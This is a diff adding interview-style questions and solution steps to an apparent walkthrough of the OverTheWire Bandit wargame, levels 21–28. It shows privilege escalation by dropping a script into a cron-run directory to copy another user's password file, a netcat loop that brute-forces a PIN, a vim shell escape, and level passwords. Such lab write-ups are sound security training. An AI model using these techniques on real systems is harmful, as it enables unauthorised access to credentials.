@@ -421,6 +421,40 @@ EeoULMCra2q0dSkYj561DX7s1CpBuOBt
 ```
 
 ## Level 21-22
+QUESTION
+
+> You discover a cron job running every minute that executes a script owned by another user. The script writes output to a temporary location.
+> 
+> **How would you:**
+> * Identify the cron job?
+> * Analyze what it does?
+> * Determine if it exposes sensitive information?
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to target system
+> ssh bandit22@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Identify cron jobs by examining cron directories
+> ls /etc/cron.d/
+> # Lists all system cron jobs to find those targeting bandit22/bandit21
+> 
+> # Step 3: Analyze the specific cron job configuration
+> cat /etc/cron.d/cronjob_bandit22
+> # View cron schedule and script location:
+> # * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+> 
+> # Step 4: Examine the script being executed by cron
+> cat /usr/bin/cronjob_bandit22.sh
+> # Analyze script functionality to understand what it does
+> 
+> # Step 5: Locate and examine the temporary output file
+> # Based on script analysis, find where output is written
+> cat /tmp/some_random_filename
+> # View contents to check for exposed sensitive information
+> # (filename would be identified from script analysis)
+> ```
+
 
 > commands
 
@@ -437,6 +471,50 @@ tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 ```
 
 ## Level 22-23
+QUESTION 
+
+> ## 🔥 Interview Scenario Question (Level 22 → 23 Type)
+> 
+> You have access to a low-privileged Linux account.
+> 
+> During enumeration, you discover:
+> * A cron job running every minute
+> * The cron job executes a script owned by another user
+> * The script creates a file in /tmp using a hashed filename
+> * The file contains sensitive credentials
+> 
+> **Your task is:**
+> * Analyze the cron job behavior
+> * Determine how the filename is generated
+> * Retrieve the stored credential
+> * Explain the security flaw
+> * Explain your step-by-step approach
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to target system
+> ssh bandit23@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Locate and list cron jobs
+> ls /etc/cron.d/
+> # Identify cron job configurations in the system directory
+> 
+> # Step 3: Examine the specific cron job for bandit23
+> cat /etc/cron.d/cronjob_bandit23
+> # View cron job configuration to understand schedule and script location
+> 
+> # Step 4: Analyze the script being executed by cron
+> cat /usr/bin/cronjob_bandit23.sh
+> # Examine script contents to understand filename generation logic
+> 
+> # Step 5: Determine how the filename is generated
+> # Based on script analysis, replicate the filename generation
+> echo "I am user bandit23" | md5sum
+> # This produces the hashed filename: 8ca319486bfbbc3663ea0fbe81326349
+> 
+> # Step 6: Retrieve the stored credential from the generated filename
+> cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+> # Successfully accesses the sensitive credential
 
 > commands
 
@@ -454,6 +532,60 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
 ## Level 23-24
+QUESTION
+
+> ## 🔥 Interview Scenario Question (Level 23 → 24 Type)
+> 
+> You have access to a low-privileged Linux user account.
+> 
+> While performing enumeration, you discover:
+> * A cron job running every minute
+> * The cron job executes scripts from a specific directory
+> * The cron job runs with higher privileges than your user
+> 
+> **Your task is:**
+> * Analyze the cron job
+> * Identify if it can be abused
+> * Escalate privileges to retrieve a protected credential
+> * Explain the security flaw
+> * Explain your step-by-step approach
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to target system
+> ssh bandit24@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Locate and analyze cron jobs
+> cd /etc/cron.d/
+> ls -l
+> # List all cron jobs to identify those running with elevated privileges
+> 
+> # Step 3: Examine the specific cron job for bandit24
+> cat cronjob_bandit24
+> # View cron job configuration to understand schedule and script location
+> 
+> # Step 4: Analyze the script being executed by cron
+> cat /usr/bin/cronjob_bandit24.sh
+> # Examine script contents to understand its functionality and permissions
+> 
+> # Step 5: Navigate to the writable directory where scripts are executed
+> cd /var/spool/bandit24/foo/
+> # This directory is monitored by cron and executes any scripts found
+> 
+> # Step 6: Create a malicious script to extract credentials
+> echo '#!/bin/bash
+> cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pw.txt' > myscript.sh
+> # Script will copy the password to a world-readable location
+> 
+> # Step 7: Make the script executable
+> chmod +x myscript.sh
+> # Ensure cron can execute it
+> 
+> # Step 8: Wait for cron to execute (runs every minute)
+> # After execution, retrieve the extracted password
+> cat /tmp/bandit23_pw.txt
+> # Successfully retrieves the bandit24 password
+
 
 > commands
 
@@ -475,6 +607,46 @@ gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
 
 ## Level 24-25
+QUESTION
+
+> ## 🔥 Interview Scenario Question (Level 24 → 25 Type)
+> 
+> You are given access to a Linux system. There is a local TCP service running on a specific port.
+> 
+> The service expects:
+> * A known password
+> * Followed by a 4-digit PIN
+> 
+> If both are correct, it returns a secret credential. You do not know the PIN.
+> 
+> **Explain step-by-step:**
+> * How you would analyze the service
+> * How you would design a solution
+> * How you would automate the attack
+> * What security weakness this represents
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to the target system
+> ssh bandit25@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Analyze the service by testing manual connection
+> # First, identify the service port (assumed to be 30002 based on context)
+> # Test connection to understand behavior
+> echo "test" | nc localhost 30002
+> 
+> # Step 3: Design brute-force solution using bash one-liner
+> # Generate all possible PIN combinations (0000-9999)
+> # Combine known password with each PIN and send to service
+> 
+> # Step 4: Automate the attack using a loop with netcat
+> for i in $(seq -w 0000 9999); do
+>     # Send known password + current PIN combination
+>     echo "$(cat /etc/bandit_pass/bandit24) $i"
+> done | nc localhost 30002
+> 
+> # The service will return the secret credential when correct PIN is found
+
 
 > commands
 
@@ -490,10 +662,54 @@ iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
 ```
 
 ## Level 25-26
+QUESTION
+
+> ## Interview Scenario Question
+> 
+> You SSH into a Linux server using valid credentials.
+> After login:
+> * You do not get a normal /bin/bash shell
+> * The session immediately exits or behaves strangely
+> * You suspect the user has a non-standard shell configured
+> 
+> **Explain step-by-step:**
+> * How you would identify which shell is being used
+> * How you would analyze its behavior
+> * How you would attempt to break out into a normal interactive shell
+> * What security misconfiguration this represents
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to the target
+> ssh bandit26@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Identify the shell being used for bandit26 user
+> cat /etc/passwd | grep bandit26
+> # Reveals the custom shell/executable configured for this user
+> 
+> # Step 3: Analyze the custom shell script's behavior
+> cat /usr/bin/showtext
+> # Examines the script content to understand its functionality and limitations
+> 
+> # Step 4: Attempt to break out into a normal interactive shell
+> # Within the restricted environment, set shell to /bin/bash
+> :set shell=/bin/bash
+> # Execute shell escape to gain normal interactive access
+> :shell
+> 
+> # Step 5: Once normal shell access is obtained, retrieve credentials
+> cat /etc/bandit_pass/bandit26
+> # Successfully retrieves the password
+
 
 > commands
 
 ssh  bandit26@bandit.labs.overthewire.org -p 2220
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
+:set shell=/bin/bash
+:shell
+cat /etc/bandit_pass/bandit26
 
 > password
 
@@ -502,6 +718,39 @@ s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
 ```
 
 ## Level 26-27
+QUESTION
+
+> You successfully gained shell access to a Linux server, but it is running in a restricted environment. You cannot execute normal commands directly.
+> 
+> **Your task is to:**
+> * Escape the restricted shell (if possible)
+> * Enumerate available files
+> * Retrieve a specific credential stored on the system
+> 
+> **Explain how you would approach this step-by-step.**
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Connect to the target server
+> ssh bandit27@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Enumerate available files in current directory
+> ls
+> # Output shows: text.txt
+> 
+> # Step 3: Examine file types to identify potential escape vectors
+> file bandit27-do
+> # Identifies the file type and permissions
+> 
+> # Step 4: Execute the binary to test functionality
+> ./bandit27-do whoami
+> # Reveals execution context/privileges
+> 
+> # Step 5: Leverage the binary to access restricted credentials
+> ./bandit27-do cat /etc/bandit_pass/bandit27
+> # Successfully retrieves the password for bandit27
+> ```
+
 
 > commands
 
@@ -511,6 +760,7 @@ text.txt
 file bandit27-do
 ./bandit27-do whoami
 ./bandit27-do cat /etc/bandit_pass/bandit27
+
 > password
 
 ```bash
@@ -518,8 +768,46 @@ upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
 ```
 
 ## Level 27-28
+QUESTION
+
+> ## 🔐 Security Challenge
+> 
+> You are given SSH access credentials to a Git server running on a non-standard port (2220). The repository is hosted remotely.
+> 
+> **Tasks:**
+> * Clone the repository securely from your local machine
+> * Analyze it
+> * Find hidden credentials inside
+> 
+> **Question:** Explain step-by-step how you would approach this
+
 
 > commands
+---------------------------------------------------
+> **Challenge:** You are given SSH access credentials to a Git server running on a non-standard port (2220), where a repository is hosted remotely, requiring you to: (1) clone the repository securely from your local machine, (2) analyze it, and (3) find hidden credentials inside — explain step-by-step how you would approach this.
+> 
+> **Solution Approach:**
+> ```
+> # Step 1: Establish SSH connection to the server
+> ssh bandit28@bandit.labs.overthewire.org -p 2220
+> 
+> # Step 2: Create temporary directory for cloning
+> mkdir /tmp/bandit27repo
+> cd /tmp/bandit27repo
+> 
+> # Step 3: Clone the repository securely using SSH key
+> GIT_SSH_COMMAND='ssh -i sshkey.private -p 2220' git clone ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
+> 
+> # Step 4: Navigate to cloned repository
+> cd repo
+> 
+> # Step 5: List contents to analyze repository structure
+> ls -la
+> 
+> # Step 6: Examine files to find hidden credentials
+> cat README
+> ```
+----------------------------------------------
 
 ssh  bandit28@bandit.labs.overthewire.org -p 2220
 mkdir /tmp/bandit27repo
